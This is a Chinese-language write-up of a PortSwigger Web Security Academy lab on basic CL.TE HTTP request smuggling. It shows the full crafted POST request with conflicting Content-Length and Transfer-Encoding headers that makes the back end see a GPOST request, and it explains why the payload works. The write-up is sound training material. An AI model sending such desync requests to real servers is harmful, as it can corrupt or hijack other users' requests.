

知識:
https://www.freebuf.com/articles/web/334057.html
https://www.jianshu.com/p/b4f46e5a37ac



This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.


本實驗涉及前端和後端服務器，前端服務器不支持分塊編碼。 前端服務器拒絕不使用 GET 或 POST 方法的請求。

解決實驗室，偷偷向後端服務器發送一個請求，使後端服務器處理的下一個請求出現使用方法`GPOST`。




#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

在請求走私攻擊中手動修復長度字段可能很棘手。 我們的 [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp 擴展旨在提供幫助。 您可以通過 BApp Store 安裝它。




#### Note

This lab is designed to demonstrate the basic concepts behind [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling). If you keep following our [learning materials](https://portswigger.net/web-security/request-smuggling), we've got plenty more labs that teach you how to exploit these vulnerabilities for some high-severity attacks.



本實驗旨在演示 [HTTP 請求走私](https://portswigger.net/web-security/request-smuggling) 背後的基本概念。 如果您繼續關注我們的 [學習資料](https://portswigger.net/web-security/request-smuggling)，我們還有更多的實驗室可以教您如何利用這些漏洞進行一些高嚴重性攻擊。



打開BP 抓首頁

打開history可以看到get 請求:
```
https://0ae500fe0478d9e8c096c3b900cb00b6.web-security-academy.net/
```


根據提示
前端伺服器 proxy 可以接受 get 和 post 請求

1.所以我們把 get 改成 post，因為這樣才能加上data 

2.刪掉user-agent 以下的header 

3.加上 header
```
Connection: keep-alive
確保為上一次TCP的連線
(我這題刪掉這個也可以成功)

(我猜這裡使為了保持連線，因為一般大站，會有無數個使用者發起TCP，如果你不用keep-alive，可能下次連線你就得不到，而是其他人被加上走私資料)


Content-Type: application/x-www-form-urlencoded
定義post form 資料


Content-Length: 6
定義CL資料長度6

Transfer-Encoding: chunked
定義TE資料使用chunked

```


最後設置走私包data
```http
POST / HTTP/1.1
Host: 0ae500fe0478d9e8c096c3b900cb00b6.web-security-academy.net
Cookie: session=33QA9vtzcsDYQeQCvYB1QgxIdzzTLl1V
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64;


Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```


這題是 前端 proxy 可以接受 CL
傳過來的header 說資料有6 bytes

實際上會有換行符號 
```
0\r\n
\r\n
G
```
剛好6個字元 (當然你定義資料長度6以上 以上也會成功送出)


proxy拿到資料後，傳給server


後端server 可以接受 TE

但 chunk 的資料長度定義為0，所以server 接收到空資料

此時G 還卡在server 的記憶體中，如果有下一筆get 或 post 請求
就會被擠在 http header 最開頭。

例如:
```http
GPOST / HTTP/1.1
Host: 0ae500fe0478d9e8c096c3b900cb00b6.web-security-academy.net
Cookie: session=33QA9vtzcsDYQeQCvYB1QgxIdzzTLl1V
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64;
.....

////////////////////////


GGET / HTTP/1.1
Host: 0ae500fe0478d9e8c096c3b900cb00b6.web-security-academy.net
Cookie: session=33QA9vtzcsDYQeQCvYB1QgxIdzzTLl1V
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64;
.....

```


所以再送一次post 就會成功。
